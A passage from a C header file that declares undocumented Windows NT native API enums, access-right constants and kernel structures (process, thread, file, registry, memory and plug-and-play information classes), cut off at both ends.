	SystemProcessorPowerInformationEx,
	SystemRefTraceInformation,
	SystemSpecialPoolInformation,
	SystemProcessIdInformation,
	SystemErrorPortInformation,
	SystemBootEnvironmentInformation,
	SystemHypervisorInformation,
	SystemVerifierInformationEx,
	SystemTimeZoneInformation,
	SystemImageFileExecutionOptionsInformation,
	SystemCoverageInformation,
	SystemPrefetchPatchInformation,
	SystemVerifierFaultsInformation,
	SystemSystemPartitionInformation,
	SystemSystemDiskInformation,
	SystemProcessorPerformanceDistribution,
	SystemNumaProximityNodeInformation,
	SystemDynamicTimeZoneInformation,
	SystemCodeIntegrityInformation,
	SystemProcessorMicrocodeUpdateInformation,
	SystemProcessorBrandString,
	SystemVirtualAddressInformation,
	MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef enum _EVENT_TRACE_INFORMATION_CLASS
{
	EventTraceKernelVersionInformation,
	EventTraceGroupMaskInformation,
	EventTracePerformanceInformation,
	EventTraceTimeProfileInformation,
	EventTraceSessionSecurityInformation,
	MaxEventTraceInfoClass
} EVENT_TRACE_INFORMATION_CLASS, *PEVENT_TRACE_INFORMATION_CLASS;

#define LOCK_QUEUE_WAIT 1
#define LOCK_QUEUE_WAIT_BIT 0

#define LOCK_QUEUE_OWNER 2
#define LOCK_QUEUE_OWNER_BIT 1

#define LOCK_QUEUE_TIMER_LOCK_SHIFT 4
#define LOCK_QUEUE_TIMER_TABLE_LOCKS (1 << (8 - LOCK_QUEUE_TIMER_LOCK_SHIFT))

typedef enum _KSPIN_LOCK_QUEUE_NUMBER {
	LockQueueDispatcherLock,
	LockQueueUnusedSpare1,
	LockQueuePfnLock,
	LockQueueSystemSpaceLock,
	LockQueueVacbLock,
	LockQueueMasterLock,
	LockQueueNonPagedPoolLock,
	LockQueueIoCancelLock,
	LockQueueWorkQueueLock,
	LockQueueIoVpbLock,
	LockQueueIoDatabaseLock,
	LockQueueIoCompletionLock,
	LockQueueNtfsStructLock,
	LockQueueAfdWorkQueueLock,
	LockQueueBcbLock,
	LockQueueMmNonPagedPoolLock,
	LockQueueUnusedSpare16,
	LockQueueTimerTableLock,
	LockQueueMaximumLock = LockQueueTimerTableLock + LOCK_QUEUE_TIMER_TABLE_LOCKS
} KSPIN_LOCK_QUEUE_NUMBER, *PKSPIN_LOCK_QUEUE_NUMBER;

typedef enum _KPROFILE_SOURCE {
	ProfileTime,
	ProfileAlignmentFixup,
	ProfileTotalIssues,
	ProfilePipelineDry,
	ProfileLoadInstructions,
	ProfilePipelineFrozen,
	ProfileBranchInstructions,
	ProfileTotalNonissues,
	ProfileDcacheMisses,
	ProfileIcacheMisses,
	ProfileCacheMisses,
	ProfileBranchMispredictions,
	ProfileStoreInstructions,
	ProfileFpInstructions,
	ProfileIntegerInstructions,
	Profile2Issue,
	Profile3Issue,
	Profile4Issue,
	ProfileSpecialInstructions,
	ProfileTotalCycles,
	ProfileIcacheIssues,
	ProfileDcacheAccesses,
	ProfileMemoryBarrierCycles,
	ProfileLoadLinkedIssues,
	ProfileMaximum
} KPROFILE_SOURCE;

typedef enum _PROCESSINFOCLASS
{
  ProcessBasicInformation,
  ProcessQuotaLimits,
  ProcessIoCounters,
  ProcessVmCounters,
  ProcessTimes,
  ProcessBasePriority,
  ProcessRaisePriority,
  ProcessDebugPort,
  ProcessExceptionPort,
  ProcessAccessToken,
  ProcessLdtInformation,
  ProcessLdtSize,
  ProcessDefaultHardErrorMode,
  ProcessIoPortHandlers,
  ProcessPooledUsageAndLimits,
  ProcessWorkingSetWatch,
  ProcessUserModeIOPL,
  ProcessEnableAlignmentFaultFixup,
  ProcessPriorityClass,
  ProcessWx86Information,
  ProcessHandleCount,
  ProcessAffinityMask,
  ProcessPriorityBoost,
  ProcessDeviceMap,
  ProcessSessionInformation,
  ProcessForegroundInformation,
  ProcessWow64Information,
  ProcessImageFileName,
  ProcessLUIDDeviceMapsEnabled,
  ProcessBreakOnTermination,
  ProcessDebugObjectHandle,
  ProcessDebugFlags,
  ProcessHandleTracing,
  ProcessIoPriority,
  ProcessExecuteFlags,
  ProcessTlsInformation,
  ProcessCookie,
  ProcessImageInformation,
  ProcessCycleTime,
  ProcessPagePriority,
  ProcessInstrumentationCallback,
  ProcessThreadStackAllocation,
  ProcessWorkingSetWatchEx,
  ProcessImageFileNameWin32,
  ProcessImageFileMapping,
  ProcessAffinityUpdateMode,
  ProcessMemoryAllocationMode,
	ProcessGroupInformation,
	ProcessTokenVirtualizationEnabled,
	ProcessConsoleHostProcess,
	ProcessWindowInformation,
  MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef enum _THREADINFOCLASS {
	ThreadBasicInformation,
	ThreadTimes,
	ThreadPriority,
	ThreadBasePriority,
	ThreadAffinityMask,
	ThreadImpersonationToken,
	ThreadDescriptorTableEntry,
	ThreadEnableAlignmentFaultFixup,
	ThreadEventPair_Reusable,
	ThreadQuerySetWin32StartAddress,
	ThreadZeroTlsCell,
	ThreadPerformanceCount,
	ThreadAmILastThread,
	ThreadIdealProcessor,
	ThreadPriorityBoost,
	ThreadSetTlsArrayAddress,   // Obsolete
	ThreadIsIoPending,
	ThreadHideFromDebugger,
	ThreadBreakOnTermination,
	ThreadSwitchLegacyState,
	ThreadIsTerminated,
	ThreadLastSystemCall,
	ThreadIoPriority,
	ThreadCycleTime,
	ThreadPagePriority,
	ThreadActualBasePriority,
	ThreadTebInformation,
	ThreadCSwitchMon,          // Obsolete
	ThreadCSwitchPmu,
	ThreadWow64Context,
	ThreadGroupInformation,
	ThreadUmsInformation,      // UMS
	ThreadCounterProfiling,
	ThreadIdealProcessorEx,
	MaxThreadInfoClass
} THREADINFOCLASS;


typedef enum _PROCESS_TLS_INFORMATION_TYPE
{
  ProcessTlsReplaceIndex,
  ProcessTlsReplaceVector,
  MaxProcessTlsOperation
} PROCESS_TLS_INFORMATION_TYPE;


#define PROCESS_TERMINATE         (0x0001)  
#define PROCESS_CREATE_THREAD     (0x0002)  
#define PROCESS_SET_SESSIONID     (0x0004)  
#define PROCESS_VM_OPERATION      (0x0008)  
#define PROCESS_VM_READ           (0x0010)  
#define PROCESS_VM_WRITE          (0x0020)
#define PROCESS_DUP_HANDLE        (0x0040)
#define PROCESS_CREATE_PROCESS    (0x0080)  
#define PROCESS_SET_QUOTA         (0x0100)  
#define PROCESS_SET_INFORMATION   (0x0200)  
#define PROCESS_QUERY_INFORMATION (0x0400)  
#define PROCESS_SET_PORT          (0x0800)
#define PROCESS_SUSPEND_RESUME    (0x0800)  

#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define ZwCurrentProcess() NtCurrentProcess()
#define ZwCurrentThread()	 NtCurrentThread()

// 28.05.2011 - rndbit
#define NtLastError() ( NtCurrentTeb()->LastErrorValue )
#define NtLastStatus()	( NtCurrentTeb()->LastStatusValue )

#if defined(_M_X86)
#define NtCurrentPID() __readfsdword(0x20)
#else
#define NtCurrentPID() __readgsqword(0x20)
#endif

#define THREAD_TERMINATE               (0x0001)  
#define THREAD_SUSPEND_RESUME          (0x0002)  
#define THREAD_ALERT                   (0x0004)
#define THREAD_GET_CONTEXT             (0x0008)  
#define THREAD_SET_CONTEXT             (0x0010)  
#define THREAD_SET_INFORMATION         (0x0020)  
#define THREAD_QUERY_INFORMATION       (0x0040)  
#define THREAD_SET_THREAD_TOKEN        (0x0080)
#define THREAD_IMPERSONATE             (0x0100)
#define THREAD_DIRECT_IMPERSONATION    (0x0200)

#define JOB_OBJECT_ASSIGN_PROCESS						(0x0001)
#define JOB_OBJECT_SET_ATTRIBUTES						(0x0002)
#define JOB_OBJECT_QUERY										(0x0004)
#define JOB_OBJECT_TERMINATE								(0x0008)
#define JOB_OBJECT_SET_SECURITY_ATTRIBUTES  (0x0010)
#ifndef _WINNT_
#define JOB_OBJECT_ALL_ACCESS								(STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1F )
#endif

#define PEB_STDIO_HANDLE_NATIVE     0
#define PEB_STDIO_HANDLE_SUBSYS     1
#define PEB_STDIO_HANDLE_PM         2
#define PEB_STDIO_HANDLE_RESERVED   3

#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

#define FOREGROUND_BASE_PRIORITY  9
#define NORMAL_BASE_PRIORITY      8

#ifndef FILE_READ_ACCESS
#define FILE_READ_ACCESS ( 0x0001 )
#endif

typedef enum _FILE_INFORMATION_CLASS
{
  FileDirectoryInformation = 1,
  FileFullDirectoryInformation,
  FileBothDirectoryInformation,
  FileBasicInformation,
  FileStandardInformation,
  FileInternalInformation,
  FileEaInformation,
  FileAccessInformation,
  FileNameInformation,
  FileRenameInformation,
  FileLinkInformation,
  FileNamesInformation,
  FileDispositionInformation,
  FilePositionInformation,
  FileFullEaInformation,
  FileModeInformation,
  FileAlignmentInformation,
  FileAllInformation,
  FileAllocationInformation,
  FileEndOfFileInformation,
  FileAlternateNameInformation,
  FileStreamInformation,
  FilePipeInformation,
  FilePipeLocalInformation,
  FilePipeRemoteInformation,
  FileMailslotQueryInformation,
  FileMailslotSetInformation,
  FileCompressionInformation,
  FileObjectIdInformation,
  FileCompletionInformation,
  FileMoveClusterInformation,
  FileQuotaInformation,
  FileReparsePointInformation,
  FileNetworkOpenInformation,
  FileAttributeTagInformation,
  FileTrackingInformation,
  FileIdBothDirectoryInformation,
  FileIdFullDirectoryInformation,
  FileValidDataLengthInformation,
  FileShortNameInformation,
  FileIoCompletionNotificationInformation,
  FileIoStatusBlockRangeInformation,
  FileIoPriorityHintInformation,
  FileSfioReserveInformation,
  FileSfioVolumeInformation,
  FileHardLinkInformation,
  FileProcessIdsUsingFileInformation,
  FileNormalizedNameInformation,
  FileNetworkPhysicalNameInformation,
  FileIdGlobalTxDirectoryInformation,
  FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS {
	FileFsVolumeInformation = 1,
	FileFsLabelInformation,
	FileFsSizeInformation,
	FileFsDeviceInformation,
	FileFsAttributeInformation,
	FileFsControlInformation,
	FileFsFullSizeInformation,
	FileFsObjectIdInformation,
	FileFsDriverPathInformation,
	FileFsVolumeFlagsInformation,
	FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

typedef enum _POOL_TYPE {
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS,
	MaxPoolType,
	NonPagedPoolSession,
	PagedPoolSession,
	NonPagedPoolMustSucceedSession,
	DontUseThisTypeSession,
	NonPagedPoolCacheAlignedSession,
	PagedPoolCacheAlignedSession,
	NonPagedPoolCacheAlignedMustSSession
} POOL_TYPE, *PPOOL_TYPE;

typedef enum _MEMORY_INFORMATION_CLASS
{
	MemoryBasicInformation,
	MemoryWorkingSetInformation,
	MemoryMappedFilenameInformation,
	MemoryRegionInformation,
	MemoryWorkingSetExInformation
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

typedef enum _REG_NOTIFY_CLASS
{
  RegNtDeleteKey,
  RegNtPreDeleteKey,
  RegNtSetValueKey,
  RegNtPreSetValueKey,
  RegNtDeleteValueKey,
  RegNtPreDeleteValueKey,
  RegNtSetInformationKey,
  RegNtPreSetInformationKey,
  RegNtRenameKey,
  RegNtPreRenameKey,
  RegNtEnumerateKey,
  RegNtPreEnumerateKey,
  RegNtEnumerateValueKey,
  RegNtPreEnumerateValueKey,
  RegNtQueryKey,
  RegNtPreQueryKey,
  RegNtQueryValueKey,
  RegNtPreQueryValueKey,
  RegNtQueryMultipleValueKey,
  RegNtPreQueryMultipleValueKey,
  RegNtPreCreateKey,
  RegNtPostCreateKey,
  RegNtPreOpenKey,
  RegNtPostOpenKey,
  RegNtKeyHandleClose,
  RegNtPreKeyHandleClose,
  RegNtPostDeleteKey,
  RegNtPostSetValueKey,
  RegNtPostDeleteValueKey,
  RegNtPostSetInformationKey,
  RegNtPostRenameKey,
  RegNtPostEnumerateKey,
  RegNtPostEnumerateValueKey,
  RegNtPostQueryKey,
  RegNtPostQueryValueKey,
  RegNtPostQueryMultipleValueKey,
  RegNtPostKeyHandleClose,
  RegNtPreCreateKeyEx,
  RegNtPostCreateKeyEx,
  RegNtPreOpenKeyEx,
  RegNtPostOpenKeyEx,
  RegNtPreFlushKey,
  RegNtPostFlushKey,
  RegNtPreLoadKey,
  RegNtPostLoadKey,
  RegNtPreUnLoadKey,
  RegNtPostUnLoadKey,
  RegNtPreQueryKeySecurity,
  RegNtPostQueryKeySecurity,
  RegNtPreSetKeySecurity,
  RegNtPostSetKeySecurity,
  RegNtCallbackObjectContextCleanup,
  MaxRegNtNotifyClass
} REG_NOTIFY_CLASS, *PREG_NOTIFY_CLASS;

typedef enum _HAL_QUERY_INFORMATION_CLASS
{
  HalInstalledBusInformation,
  HalProfileSourceInformation,
  HalInformationClassUnused1,
  HalPowerInformation,
  HalProcessorSpeedInformation,
  HalCallbackInformation,
  HalMapRegisterInformation,
  HalMcaLogInformation,
  HalFrameBufferCachingInformation,
  HalDisplayBiosInformation,
  HalProcessorFeatureInformation,
  HalNumaTopologyInterface,
  HalErrorInformation,
  HalCmcLogInformation,
  HalCpeLogInformation,
  HalQueryMcaInterface,
  HalQueryAMLIIllegalIOPortAddresses,
  HalQueryMaxHotPlugMemoryAddress,
  HalPartitionIpiInterface,
  HalPlatformInformation,
  HalQueryProfileSourceList,
  HalInitLogInformation,
  HalFrequencyInformation,
  HalProcessorBrandString
} HAL_QUERY_INFORMATION_CLASS, *PHAL_QUERY_INFORMATION_CLASS;


#if defined(_WINNT_) && (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef enum POWER_INFORMATION_LEVEL {
  SystemPowerPolicyAc = 0x0,
  SystemPowerPolicyDc = 0x1,
  VerifySystemPolicyAc = 0x2,
  VerifySystemPolicyDc = 0x3,
  SystemPowerCapabilities = 0x4,
  SystemBatteryState = 0x5,
  SystemPowerStateHandler = 0x6,
  ProcessorStateHandler = 0x7,
  SystemPowerPolicyCurrent = 0x8,
  AdministratorPowerPolicy = 0x9,
  SystemReserveHiberFile = 0xa,
  ProcessorInformation = 0xb,
  SystemPowerInformation = 0xc,
  ProcessorStateHandler2 = 0xd,
  LastWakeTime = 0xe,
  LastSleepTime = 0xf,
  SystemExecutionState = 0x10,
  SystemPowerStateNotifyHandler = 0x11,
  ProcessorPowerPolicyAc = 0x12,
  ProcessorPowerPolicyDc = 0x13,
  VerifyProcessorPowerPolicyAc = 0x14,
  VerifyProcessorPowerPolicyDc = 0x15,
  ProcessorPowerPolicyCurrent = 0x16,
  SystemPowerStateLogging = 0x17,
  SystemPowerLoggingEntry = 0x18,
  SetPowerSettingValue = 0x19,
  NotifyUserPowerSetting = 0x1a,
  GetPowerTransitionVetoes = 0x1b,
  SetPowerTransitionVeto = 0x1c,
  SystemVideoState = 0x1d,
  TraceApplicationPowerMessage = 0x1e,
  TraceApplicationPowerMessageEnd = 0x1f,
  ProcessorPerfStates = 0x20,
  ProcessorIdleStates = 0x21,
  ProcessorThrottleStates = 0x22,
  SystemWakeSource = 0x23,
  SystemHiberFileInformation = 0x24,
  TraceServicePowerMessage = 0x25,
  ProcessorLoad = 0x26,
  PowerShutdownNotification = 0x27,
  MonitorCapabilities = 0x28
};
#endif

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef VOID(NTAPI *PIO_APC_ROUTINE)(
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG Reserved
	);

typedef struct _X86_FLOATING_SAVE_AREA
{
	ULONG ControlWord;
	ULONG StatusWord;
	ULONG TagWord;
	ULONG ErrorOffset;
	ULONG ErrorSelector;
	ULONG DataOffset;
	ULONG DataSelector;
	UCHAR RegisterArea[ 80 ];
	ULONG Cr0NpxState;
} X86_FLOATING_SAVE_AREA, *PX86_FLOATING_SAVE_AREA;

typedef struct _X86_CONTEXT
{
	ULONG ContextFlags;
	ULONG Dr0;
	ULONG Dr1;
	ULONG Dr2;
	ULONG Dr3;
	ULONG Dr6;
	ULONG Dr7;
	X86_FLOATING_SAVE_AREA FloatSave;
	ULONG SegGs;
	ULONG SegFs;
	ULONG SegEs;
	ULONG SegDs;
	ULONG Edi;
	ULONG Esi;
	ULONG Ebx;
	ULONG Edx;
	ULONG Ecx;
	ULONG Eax;
	ULONG Ebp;
	ULONG Eip;
	ULONG SegCs;
	ULONG EFlags;
	ULONG Esp;
	ULONG SegSs;
} X86_CONTEXT, *PX86_CONTEXT;

#define FILE_SUPERSEDE                  0x00000000
#define FILE_OPEN                       0x00000001
#define FILE_CREATE                     0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_OVERWRITE                  0x00000004
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_MAXIMUM_DISPOSITION        0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

#define WIN32_CLIENT_INFO_LENGTH 62

#define PIO_APC_ROUTINE_DEFINED

typedef struct _PORT_VIEW {
	ULONG Length;
	LPC_HANDLE SectionHandle;
	ULONG SectionOffset;
	LPC_SIZE_T ViewSize;
	LPC_PVOID ViewBase;
	LPC_PVOID ViewRemoteBase;
} PORT_VIEW, *PPORT_VIEW;

typedef struct _REMOTE_PORT_VIEW {
	ULONG Length;
	LPC_SIZE_T ViewSize;
	LPC_PVOID ViewBase;
} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;

#define IO_COMPLETION_QUERY_STATE   0x0001
#define IO_COMPLETION_MODIFY_STATE  0x0002  
#define IO_COMPLETION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

typedef enum _IO_COMPLETION_INFORMATION_CLASS {
	IoCompletionBasicInformation
} IO_COMPLETION_INFORMATION_CLASS;

typedef enum _PORT_INFORMATION_CLASS {
	PortBasicInformation
} PORT_INFORMATION_CLASS;

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

//added 21/03/2011
typedef struct _MEMORY_WORKING_SET_BLOCK
{
	ULONG_PTR Protection : 5;
	ULONG_PTR ShareCount : 3;
	ULONG_PTR Shared : 1;
	ULONG_PTR Node : 3;
#if defined(_M_X64)
	ULONG_PTR VirtualPage : 52;
#else
	ULONG VirtualPage : 20;
#endif
} MEMORY_WORKING_SET_BLOCK, *PMEMORY_WORKING_SET_BLOCK;

typedef struct _MEMORY_WORKING_SET_INFORMATION
{
	ULONG_PTR NumberOfEntries;
	MEMORY_WORKING_SET_BLOCK WorkingSetInfo[1];
} MEMORY_WORKING_SET_INFORMATION, *PMEMORY_WORKING_SET_INFORMATION;

typedef struct _MEMORY_WORKING_SET_EX_BLOCK
{
	ULONG_PTR Valid : 1;
	ULONG_PTR ShareCount : 3;
	ULONG_PTR Win32Protection : 11;
	ULONG_PTR Shared : 1;
	ULONG_PTR Node : 6;
	ULONG_PTR Locked : 1;
	ULONG_PTR LargePage : 1;
	ULONG_PTR Priority : 3;
	ULONG_PTR Reserved : 5;

#if defined(_M_X64)
	ULONG_PTR ReservedUlong : 32;
#endif
} MEMORY_WORKING_SET_EX_BLOCK, *PMEMORY_WORKING_SET_EX_BLOCK;

typedef struct _MEMORY_REGION_INFORMATION
{
	PVOID AllocationBase;
	ULONG AllocationProtect;
	ULONG RegionType;
	SIZE_T RegionSize;
} MEMORY_REGION_INFORMATION, *PMEMORY_REGION_INFORMATION;

typedef struct _MEMORY_WORKING_SET_EX_INFORMATION
{
	PVOID VirtualAddress;
	union
	{
		MEMORY_WORKING_SET_EX_BLOCK VirtualAttributes;
		ULONG Long;
	};
} MEMORY_WORKING_SET_EX_INFORMATION, *PMEMORY_WORKING_SET_EX_INFORMATION;

typedef
VOID
(*PTIMER_APC_ROUTINE) (
    IN PVOID TimerContext,
    IN ULONG TimerLowValue,
    IN LONG TimerHighValue
    );

typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION;

typedef enum _ATOM_INFORMATION_CLASS
{
	AtomBasicInformation,
	AtomTableInformation
} ATOM_INFORMATION_CLASS;

typedef struct _ATOM_BASIC_INFORMATION
{
	USHORT UsageCount;
	USHORT Flags;
	USHORT NameLength;
	WCHAR Name[1];
} ATOM_BASIC_INFORMATION, *PATOM_BASIC_INFORMATION;

typedef struct _ATOM_TABLE_INFORMATION
{
	ULONG NumberOfAtoms;
	RTL_ATOM Atoms[1];
} ATOM_TABLE_INFORMATION, *PATOM_TABLE_INFORMATION;

#define SEMAPHORE_QUERY_STATE       0x0001
#define SEMAPHORE_MODIFY_STATE      0x0002

#define SEMAPHORE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3)

typedef enum _SEMAPHORE_INFORMATION_CLASS {
	SemaphoreBasicInformation
} SEMAPHORE_INFORMATION_CLASS;

typedef struct _SEMAPHORE_BASIC_INFORMATION {
	LONG CurrentCount;
	LONG MaximumCount;
} SEMAPHORE_BASIC_INFORMATION, *PSEMAPHORE_BASIC_INFORMATION;

#define MUTANT_QUERY_STATE      0x0001

#define MUTANT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|\
	MUTANT_QUERY_STATE)

typedef enum _MUTANT_INFORMATION_CLASS {
	MutantBasicInformation
} MUTANT_INFORMATION_CLASS;

typedef struct _MUTANT_BASIC_INFORMATION {
	LONG CurrentCount;
	BOOLEAN OwnedByCaller;
	BOOLEAN AbandonedState;
} MUTANT_BASIC_INFORMATION, *PMUTANT_BASIC_INFORMATION;

#define TIMER_QUERY_STATE       0x0001
#define TIMER_MODIFY_STATE      0x0002

#define TIMER_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|\
	TIMER_QUERY_STATE|TIMER_MODIFY_STATE)
typedef enum _TIMER_INFORMATION_CLASS {
	TimerBasicInformation
} TIMER_INFORMATION_CLASS;

typedef struct _TIMER_BASIC_INFORMATION {
	LARGE_INTEGER RemainingTime;
	BOOLEAN TimerState;
} TIMER_BASIC_INFORMATION, *PTIMER_BASIC_INFORMATION;

typedef enum _SECTION_INFORMATION_CLASS {
	SectionBasicInformation,
	SectionImageInformation,
	MaxSectionInfoClass
} SECTION_INFORMATION_CLASS;

#define OBJ_NAME_PATH_SEPARATOR ((WCHAR)L'\\')
#define OBJ_MAX_REPARSE_ATTEMPTS 32
#define OBJECT_TYPE_CREATE (0x0001)
#define OBJECT_TYPE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)

#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

typedef enum _OBJECT_INFORMATION_CLASS {
	ObjectBasicInformation,
	ObjectNameInformation,
	ObjectTypeInformation,
	ObjectTypesInformation,
	ObjectHandleFlagInformation,
	ObjectSessionInformation,
	MaxObjectInfoClass
} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_BASIC_INFORMATION {
	ULONG Attributes;
	ACCESS_MASK GrantedAccess;
	ULONG HandleCount;
	ULONG PointerCount;
	ULONG PagedPoolCharge;
	ULONG NonPagedPoolCharge;
	ULONG Reserved[ 3 ];
	ULONG NameInfoSize;
	ULONG TypeInfoSize;
	ULONG SecurityDescriptorSize;
	LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
	UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_TYPES_INFORMATION
{
	ULONG NumberOfTypes;
	OBJECT_TYPE_INFORMATION TypeInformation;
} OBJECT_TYPES_INFORMATION, *POBJECT_TYPES_INFORMATION;

typedef struct _OBJECT_HANDLE_FLAG_INFORMATION
{
	BOOLEAN Inherit;
	BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;

typedef enum _PLUGPLAY_EVENT_CATEGORY {
	HardwareProfileChangeEvent,
	TargetDeviceChangeEvent,
	DeviceClassChangeEvent,
	CustomDeviceEvent,
	DeviceInstallEvent,
	DeviceArrivalEvent,
	PowerEvent,
	VetoEvent,
	BlockedDriverEvent,
	InvalidIDEvent,
	MaxPlugEventCategory
} PLUGPLAY_EVENT_CATEGORY, *PPLUGPLAY_EVENT_CATEGORY;

typedef enum _PNP_VETO_TYPE {
	PNP_VetoTypeUnknown,            // Name is unspecified
	PNP_VetoLegacyDevice,           // Name is an Instance Path
	PNP_VetoPendingClose,           // Name is an Instance Path
	PNP_VetoWindowsApp,             // Name is a Module
	PNP_VetoWindowsService,         // Name is a Service
	PNP_VetoOutstandingOpen,        // Name is an Instance Path
	PNP_VetoDevice,                 // Name is an Instance Path
	PNP_VetoDriver,                 // Name is a Driver Service Name
	PNP_VetoIllegalDeviceRequest,   // Name is an Instance Path
	PNP_VetoInsufficientPower,      // Name is unspecified
	PNP_VetoNonDisableable,         // Name is an Instance Path
	PNP_VetoLegacyDriver,           // Name is a Service
	PNP_VetoInsufficientRights      // Name is unspecified
}   PNP_VETO_TYPE, *PPNP_VETO_TYPE;

typedef struct _PLUGPLAY_EVENT_BLOCK {
	//
	// Common event data
	//
	GUID EventGuid;
	PLUGPLAY_EVENT_CATEGORY EventCategory;
	PULONG Result;
	ULONG Flags;
	ULONG TotalSize;
	PVOID DeviceObject;

	union {

		struct {
			GUID ClassGuid;
			WCHAR SymbolicLinkName[1];
		} DeviceClass;

		struct {
			WCHAR DeviceIds[1];
		} TargetDevice;

		struct {
			WCHAR DeviceId[1];
		} InstallDevice;

		struct {
			PVOID NotificationStructure;
			WCHAR DeviceIds[1];
		} CustomNotification;

		struct {
			PVOID Notification;
		} ProfileNotification;

		struct {
			ULONG NotificationCode;
			ULONG NotificationData;
		} PowerNotification;

		struct {
			PNP_VETO_TYPE VetoType;
			WCHAR DeviceIdVetoNameBuffer[1]; // DeviceId<NULL>VetoName<NULL><NULL>
		} VetoNotification;

		struct {
			GUID BlockedDriverGuid;
		} BlockedDriverNotification;

		struct {
			WCHAR ParentId[1];
		} InvalidIDNotification;

	} u;

